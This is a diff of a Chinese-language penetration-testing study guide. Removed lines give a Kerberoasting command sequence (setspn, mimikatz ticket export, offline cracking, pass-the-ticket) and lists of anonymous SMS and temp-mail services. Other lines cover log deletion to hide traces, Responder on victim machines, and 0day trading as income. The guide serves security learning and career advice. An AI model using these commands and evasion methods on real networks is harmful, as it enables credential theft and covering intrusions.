-黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。
-**探针**
-
-```bash
-# 类似于隐蔽的nmap扫描端口结果
-setspn -q */*
-setspn -q */* | findstr "MSSQL"
-```
-
-**请求**
-
-```c
-Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "xxxx"
-mimikatz.exe "kerberos::ask /target:xxxx"
-```
-
-**导出**
-
-```bash
-mimikatz.exe "kerberos::list /export"
-```
-
-**破解**
-
-```bash
-python tgsrepcrack.py passwd.txt xxxx.kirbi
-python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvcSrv-DB-0day.0day.org1433-0DAY.ORG.kirbi
-```
-
-**重写**
-
-```bash
-python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500
-python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512
-mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存
-```
 
 # 代码审计
 
-如果你没有任何编程基础，这一部分就不要指望学到太多东西。
+代码审计需要有一定的开发能力，对于拥有这里能力的人而言，这能够快速发现漏洞。
 代码审计是指你获得源代码后对代码进行下载交互操作并做源代码层面的分析，因此你在做审计前通常需要提前配置好相关环境。
 代码审计的内容可能是审计框架也可能是审计混写也可能是程序员全程自己写的
 
@@ -5087,7 +5299,7 @@ seay系统可以帮助你建立快捷搜索，全局搜索关键词和函数，�
 >
 > **XSS跨站**： print print_r echo，sprintf die var_dump var_export等 
 >
-> **文件包含**： Include include_once require， require_once等 
+> **文件包含**： Include,include_once require， require_once等 
 >
 > **代码执行**： eval assert preg replace call user func call user，func array等 
 >
@@ -5188,53 +5400,17 @@ ctrl+shift+F 全局搜索，通常搜索出关键词有可能匹配过多，可�
 **引用追踪**
 快捷键，ALT+F7 通常能查找出引用，但如果你查找的函数是被放在了jar就找不到了。需要在IDE中先对jar 添加为库才可以看到里面的代码，在载入到项目中才可以搜索到
 
+# 待补充：物理攻击
+## wifi
+## 
 
-
-# 隐藏技术
-
+# 待补充：隐藏技术
 阻止防御者信息搜集，销毁行程记录，隐藏存留文件。
 
+
 ## 实用工具
+该项目旨在以 Pythonic 的方式轻松地与 Microsoft Graph 和 Office 365 进行交互。访问电子邮件、日历、联系人、OneDrive 等。很容易以一种对初学者来说简单而直接的方式进行，对经验丰富的 Python 程序员来说感觉恰到好处。一旦我们攻击进了 Windows 系统，我们就可以在受害者机器上使用 PowerShell 进行 Responder 攻击。工具如下https://github.com/lgandx/Responder
 
-### 匿名工具
-
-**手机**
-下面是一些免费的接码平台，可以收取短信验证码
-
-国际接码，不过中国的也很多 https://yunjisms.xyz/
-
-大多是其他国家的手机号，你注册有的网站可能无法识别此号码https://www.bfkdim.com/
-https://jiemahao.com
-http://zg.114sim.com/
-
-
-http://114sim.com/
-
-https://yunduanxin.net/
-http://z-sms.com/
-https://zusms.com
-
-www.kakasms.com
-www.materialtools.com
-www.suiyongsuiqi.com
-mianfeijiema.com
-www.114sim.com
-yunduanxin.net
-www.shejiinn.com
-www.zusms.com
-
-
-**邮箱**
-好用 https://www.moakt.com/zh
-https://temp-mail.org/zh/
-https://www.guerrillamail.com/zh/
-http://links.icamtech.com/
-
-VPS
-
-纯净无线设备
-
-纯净移动设备
 
 
 ###  日志删除
@@ -5260,8 +5436,21 @@ touch –r
 
 
 # 下一步
+## 渗透发展
+### 自动化
+以前国内外还没有几家AI+渗透的公司，现在已经越来越多了，而开源的项目也有朝着此方向发展的。相信不久后大牛会带我们进入这个时代，一些自动化开源项目如下：
+https://github.com/mitre/caldera
+## 待整理：个人发展与规划
+### 找工作
+**面试看重什么**
+也可以朝着以下方向做准备
+在xx安全论坛投稿过xx篇文章，获得xx元稿费。
+在xx众测,提交过xx漏洞，获得过xx元奖金。
+有x年以上的Web/App漏洞挖掘、业务逻辑漏洞挖掘经验。
+精通xx,xx,xx语言，能独立开发poc和exp。
+获取xx张CNVD证书 和 xx CVE编号。
+在xx安全会议上进行过xx演讲。
 
-## 找工作
 **写简历**
 免费简历模板，快速生成个人简历https://www.100chui.com/resume/
 ****
@@ -5271,42 +5460,16 @@ https://www.freebuf.com/jobs
 ****
 **找工作**
 各大网站发布得都比较散，要自行点进去一个个看。
-https://www.lagou.com/wn/jobs?px=new&pn=2&xl=%E6%9C%AC%E7%A7%91&fromSearch=true&kd=%E6%B8%97%E9%80%8F&city=%E6%B7%B1%E5%9C%B3
+脉脉，这个真的不错，超乎意料
+拉勾
+BOSS直聘
 http://www.hackdig.com/?cat-4.htm
 https://www.chamd5.org/jobs.aspx
 https://www.anquanke.com/job/
-## 自学
-①不建议：网上有很多关于不实用的渗透技术介绍文章，不要花大量时间去研究漏洞已经濒临灭绝的，即：
-
-1. 漏洞条件苛刻：默认情况下需要网站管理员开启危险服务的(呵呵，想得美)
-2. 过于古老：漏洞发生在已经快被淘汰的版本
 
 
-
-
-### 文档
-
-文档较全 https://websec.readthedocs.io/zh/latest/language/python/unserialize.html
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210627215558439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-
-有部分有用文档 http://www.xiaodi8.com/?page=2
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210627215524558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-### 视频
-
-**小迪安全**
-推荐指数：5
-预备技能：一点编程、基础安全知识
-整体评价：干货多
-[视频很推荐B站小迪8 课程从2020/5/20开始](https://www.bilibili.com/video/BV1JZ4y1c7ro?p=4&spm_id_from=pageDriver)
-这些笔记写得粗略简单，没有个人总结，但是我没有找到更好的，就将就着看好了。
-笔记已更新到七十二天https://www.cnblogs.com/SnowSec/category/1908585.html?page=2
-
-暗月安全培训（听说不错，看完小迪再看）
-
-## 如何赚钱
-### 靠技术
+### 如何赚钱
+#### 靠技术
 
 
 
@@ -5316,7 +5479,7 @@ https://www.anquanke.com/job/
 CTF代打
 HW行动面试
 0day交易
-### 技术沾边
+#### 技术沾边
 
  **当老师**
 给视频加字幕方法https://www.iculture.cc/knowledge/pig=168
@@ -5325,8 +5488,15 @@ HW行动面试
 **售卖网课**
 **售卖电子书**
 售卖国外电子书，这个网站有大量免费国外电子书网站链接 https://freeditorial.com/
+### 自学
+①不建议：网上有很多关于不实用的渗透技术介绍文章，不要花大量时间去研究漏洞已经濒临灭绝的，即：
 
-## 刷题
+1. 漏洞条件苛刻：默认情况下需要网站管理员开启危险服务的(呵呵，想得美)
+2. 过于古老：漏洞发生在已经快被淘汰的版本
+
+
+
+#### 刷题
 **经典**
 DVWA
 web山羊
@@ -5337,7 +5507,7 @@ web山羊
 国外靶场vulnhub，更贴近实际环境，靶机需要你从扫描开始对其进行漏洞利用。官网地址 https://www.vulnhub.com/
 
 
-## 工具社区
+#### 社区
 
 https://www.securityfocus.com/
 
@@ -5367,6 +5537,7 @@ securitytracker
 
 穷奇、海莲花这两个APT组织的攻击活动
 
+
 ## 社区
 
 https://www.reddit.com/r/websecurityresearch/
@@ -5389,6 +5560,19 @@ Comp-TIA另一个受人尊敬的全球网络安全领导者，Comp-TIA 组织提
 
 https://www.classcentral.com/subject/cybersecurity?free=true
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210624142258642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+有部分有用文档 http://www.xiaodi8.com/?page=2
+
+
+**小迪安全**
+推荐指数：5
+预备技能：一点编程、基础安全知识
+整体评价：干货多
+[视频很推荐B站小迪8 课程从2020/5/20开始](https://www.bilibili.com/video/BV1JZ4y1c7ro?p=4&spm_id_from=pageDriver)
+这些笔记写得粗略简单，没有个人总结，但是我没有找到更好的，就将就着看好了。
+笔记已更新到七十二天https://www.cnblogs.com/SnowSec/category/1908585.html?page=2
+
+暗月安全培训,听说不错，还没时间看
 
 1. IT 和网络安全简介
    由Cybrary IT 提供
@@ -5659,81 +5843,10 @@ OWASP亚洲峰会
 ### 红蓝对抗
 国际叫法是蓝队是防守，红队是攻击
 ```bash
-考察点：web居多
-前期准备：
-	3-5人分工明确
-	环境
-	WAF脚本（成品WAF不让用）
-	漏洞EXP/POC库
-必备操作：
-	备份网站
-	修改数据库、网页登录默认密码
-	查看是否留有后门账户
-	关闭不必要端口
-	使用命令匹配一句话特性
-	关注是否运行了特殊进程
-	权限高可以设置防火墙或禁止他人修改目录
-预热时间，会给30min的熟悉环境时间
-	防守：
-		部署WAF：
-			AoiAWD
-		扫描后门，官方很可能自带后门：
-			用WAF一键扫描
-			seay
-		文件监控，后门清除，文件自动还原
-		日志记录
-		代码审计
-	攻击：
-		在对方开启文件监控前上传不死马
-	技巧：
-		假界面
-		搅屎棍。发送垃圾数据，隐藏真实数据
-		回首掏。拦截别人的攻击数据包，将别人攻击的数据包转发到其他团队做攻击
-```
-
-### SRC
- 教育行业平台
-网址：https://src.sjtu.edu.cn
-难度：简单
-范围：广，各大高校
-奖赏：低
-思路：
-直接上扫描工具：AWVS，xray等;
-关注最新爆出来的网站漏洞，有EXP的直接利用exp；假设你发现dedecms爆出最新漏洞，你就利用网络空间搜索如edu.cn & dedecms。
-****
-网址：
-漏洞盒子 https://www.vulbox.com/projects/list
-难度：难
-范围：窄，仅限挂名的网站
-奖赏：中
-审核：周六日不上班；审核机制审核一般在1-3个工作日，那么漏洞盒子自动确认漏洞并且得到积分的时间需要1-11天，在第十一天就会确定此漏洞
-思路：
-
-**经验**
-在挖漏洞一定要写清楚细节，对于中高危最好录个像。
-刷众测平台，这一般要在补天或者漏洞盒子上拿到排名才有机会参加。
-
-佛系挖：适合初学者练手，随缘挖。
-**链接**
-
-CNVD
-教育行业漏洞报告平台
-补天漏洞响应平台：https://butian.360.cn/
-漏洞银行：https://www.bugbank.cn/
-阿里云漏洞响应平台：https://security.alibaba.com/
-i春秋SRC部落：https://www.ichunqiu.com/src
-腾讯应急响应中心：https://security.tencent.com/index.php
-搜狗安全应急响应平台（http://www.0xsafe.com/#SGSRC）
-[hackerone](https://www.hackerone.com/ "hackerone")
-[bugcrowd](https://www.bugcrowd.com/ "bugcrowd")
-https://www.synack.com/
-https://cobalt.io/
-国外比较常见的漏洞赏金平台是 HackerOne，BugCrowd 和 SynAck。还有很多其他的平台。这些平台可以支付从零到两万美元以上之间的奖励。
-
-
+考
 
 ## 图书推荐
-### 基础
+**基础**
 Web之困
 白帽子讲浏览器安全(钱文祥)
 Web前端黑客技术揭秘
@@ -5745,7 +5858,7 @@ Kali Linux Revealed: Mastering the Penetration Testing Distribution（难易度�
 这是一本有关 Kali Linux 的黑客书籍
 The Hackers Playbook 2（难易度：★★★☆☆）
 The Hackers Playbook 3（难易度：★★★☆☆）
-### 中级
+**中级**
 Improving your Penetration Testing Skills（难易度：★★★★☆）
 这本书的学习路径专为希望了解漏洞利用并充分利用 Metasploit 框架的安全专业人员、Web 程序员和渗透测试人员而设计。需要对渗透和 Metasploit 测试有所了解，基本的系统管理技能和读取代码的能力也是必不可少的。
 
@@ -5791,10 +5904,6 @@ Hackear al Hacker. Aprende de los Expertos que Derrotan a los Hackers（难易�
 
 2012年出版，里面讲到常规漏洞XSS
 
-《欺骗的艺术》
-两星推荐
-级别：初级
-出版。本书作者是当时最厉害的黑客，书的内容主要是社会工程学，内容很简单，没有任何技术全是心理学。
 
 《黑客攻防：实战加密与解密》
 两星推荐
@@ -5838,13 +5947,9 @@ Hackear al Hacker. Aprende de los Expertos que Derrotan a los Hackers（难易�
 
 
 ## 如何修成
-
-理解这些东西将带你走出瓶颈，知道你应该为提升什么能力而努力，直到你对这些东西充分理解才不会花了好几年成为一个平淡无奇的黑客。具体你有时间可以多读我的这一小节推荐链接。
-
-
+以下内容请多参考我的推荐链接。我只是如实将大佬的总结整理了一下。
 
 #### 成为什么样的人
-
 
 1. 任何问题都不应该被解决两次
 2. 这个世界充满了迷人的问题等待解决。
@@ -5926,3 +6031,5 @@ IT审计人员的必备之证——CISA
 总结：在国内知名出版社出书，其实是个体力活
     可能当下，写公众号和录视频等的方式，挣钱收益要高于出书，不过话可以这样说，经营公众号和录制视频也是个长期的事情，在短时间里可能未必有收益，如果不是系统地发表内容的话，可能甚至不会有收益。所以出书可能是个非常好的前期准备工作，你靠出书系统积累了素材，靠出书整合了你的知识体系，那么在此基础上，靠公众号或者录视频挣钱可能就会事半功倍。
 不过老实说，写书的意义不在于赚钱。仅仅从赚钱的角度来说，出网课可能更划算一些。但是如果想给自己的职业生涯留点东西，写书意义大于出网课。
+
+
